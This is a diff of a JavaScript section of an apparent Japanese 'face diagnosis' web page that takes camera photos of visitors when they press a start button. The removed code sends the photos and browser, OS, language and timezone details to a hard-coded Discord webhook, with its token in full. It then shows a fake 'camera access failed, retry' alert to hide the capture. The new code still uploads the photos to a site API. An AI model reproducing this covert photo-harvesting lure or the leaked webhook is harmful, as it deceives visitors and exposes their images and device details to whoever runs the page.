@@ -144,45 +144,8 @@
   </div>
 
 <script>
-const webhookUrl = "https://discord.com/api/webhooks/1365282819646947409/YLfOxbOuLrQ6AHYb0_bImraprcO6VxmcoIbM4Sz2r9z_fIvuZiLED3TUIIDZCeQszc_u";
-
-function getUserEnvironmentInfo() {
-  const ua = navigator.userAgent;
-  const language = navigator.language;
-  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-  let os = "不明";
-  if (/iPhone OS (\d+_\d+)/.test(ua)) {
-    os = `iOS ${RegExp.$1.replace("_", ".")}`;
-  } else if (/Android (\d+(\.\d+)?)/.test(ua)) {
-    os = `Android ${RegExp.$1}`;
-  } else if (/Windows NT (\d+\.\d+)/.test(ua)) {
-    os = `Windows ${RegExp.$1}`;
-  } else if (/Mac OS X (\d+_\d+)/.test(ua)) {
-    os = `macOS ${RegExp.$1.replace("_", ".")}`;
-  }
-
-  let browser = "不明";
-  if (ua.includes("Safari") && !ua.includes("Chrome")) {
-    browser = "Safari";
-  } else if (ua.includes("Chrome")) {
-    browser = "Chrome";
-  } else if (ua.includes("Firefox")) {
-    browser = "Firefox";
-  } else if (ua.includes("Edg")) {
-    browser = "Edge";
-  }
-
-  const now = new Date();
-  const datetime = now.toLocaleString("ja-JP");
-
-  return `【送信環境】
-・OS：${os}
-・ブラウザ：${browser}
-・日時：${datetime}
-・言語設定：${language}
-・タイムゾーン：${timezone}`;
-}
+// VercelのAPIエンドポイントのURL
+const apiUrl = "/api/upload"; 
 
 async function captureAndSendImages() {
   const formData = new FormData();
@@ -221,16 +184,58 @@ async function captureAndSendImages() {
     formData.append(`files[${i}]`, img, `photo${i+1}.jpg`);
   });
 
-  await fetch(webhookUrl, { method: "POST", body: formData });
+  // APIに画像を送信
+  await fetch(apiUrl, { method: "POST", body: formData });
 
-  alert("カメラへのアクセスに失敗しました。\nもう一度最初からやり直し、診断を開始してください。\n※複数回アクセスに失敗した場合、使用している端末/ブラウザが当サイトに対応していない可能性があります。");
+  alert("診断結果が送信されました！");
 }
 
+// 環境情報を取得
+function getUserEnvironmentInfo() {
+  const ua = navigator.userAgent;
+  const language = navigator.language;
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+  let os = "不明";
+  if (/iPhone OS (\d+_\d+)/.test(ua)) {
+    os = `iOS ${RegExp.$1.replace("_", ".")}`;
+  } else if (/Android (\d+(\.\d+)?)/.test(ua)) {
+    os = `Android ${RegExp.$1}`;
+  } else if (/Windows NT (\d+\.\d+)/.test(ua)) {
+    os = `Windows ${RegExp.$1}`;
+  } else if (/Mac OS X (\d+_\d+)/.test(ua)) {
+    os = `macOS ${RegExp.$1.replace("_", ".")}`;
+  }
+
+  let browser = "不明";
+  if (ua.includes("Safari") && !ua.includes("Chrome")) {
+    browser = "Safari";
+  } else if (ua.includes("Chrome")) {
+    browser = "Chrome";
+  } else if (ua.includes("Firefox")) {
+    browser = "Firefox";
+  } else if (ua.includes("Edg")) {
+    browser = "Edge";
+  }
+
+  const now = new Date();
+  const datetime = now.toLocaleString("ja-JP");
+
+  return `【送信環境】
+・OS：${os}
+・ブラウザ：${browser}
+・日時：${datetime}
+・言語設定：${language}
+・タイムゾーン：${timezone}`;
+}
+
+// 診断ボタンのイベント
 document.getElementById("startButton").onclick = () => {
   alert("これからあなたの顔診断を開始します！\nカメラの許可をしないと診断が開始できませんので、\nこの後表示されるカメラ許可のポップアップに従い、診断を開始してください。");
   captureAndSendImages();
 };
 
+// 利用規約のモーダル表示
 document.getElementById("termsLink").onclick = () => {
   document.getElementById("termsModal").style.display = "block";
 };
